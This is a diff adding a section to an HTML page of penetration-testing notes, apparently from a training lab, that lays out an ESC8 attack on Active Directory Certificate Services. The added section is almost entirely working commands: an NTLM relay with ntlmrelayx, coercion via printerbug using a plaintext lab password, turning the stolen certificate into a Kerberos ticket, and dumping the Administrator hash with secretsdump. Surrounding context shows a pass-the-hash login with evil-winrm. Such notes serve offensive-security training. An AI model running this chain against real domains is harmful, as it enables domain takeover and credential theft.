@@ -40,6 +40,22 @@
                     <p>Authenticate using evilwinrm using the NT hash obtained </p>
                     <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
                 </ul>
+                
+                <h2>Here we will se an example of how to perform pass the certificate or (ESC8)</h2>
+                <ul>
+                    <p>Performing an NTLM relay towards the IP of the AC</p>
+                    <pre><code class="language-powershell">ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication</code></pre>
+                    <p>In order to trigger that NTLM relay we will use</p>
+                    <pre><code class="language-powershell">python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.100</code></pre>
+                    <p>This will provide us with a base64 certificate which we will have to decode</p>
+                    <pre><code class="language-powershell">cat base64ticket | base64 -d > cert.pfx</code></pre>
+                    <p>Now we will convert that certificate to a ticket</p>
+                    <pre><code class="language-powershell">python3 gettgtpkinit.py -cert-pfx /home/kali/Desktop/cert.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache</code></pre>
+                    <p>Then we will export the ticket in order to useit </p>
+                    <pre><code class="language-powershell">export KRB5CCNAME=/tmp/dc.ccache </code></pre>
+                    <p>And finally we will use the ticket to authenticate and dump hashes</p>
+                    <pre><code class="language-powershell">secretsdump.py -k -no-pass -dc-ip 10.129.234.174 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL -just-dc-user Administrator</code></pre>
+                </ul>
 
                 <h2>Active Directory Certificate Services (ADCS) | Arbitrary Application Policy Injection in V1 Templates ESC15 </h2>
                 <ul>
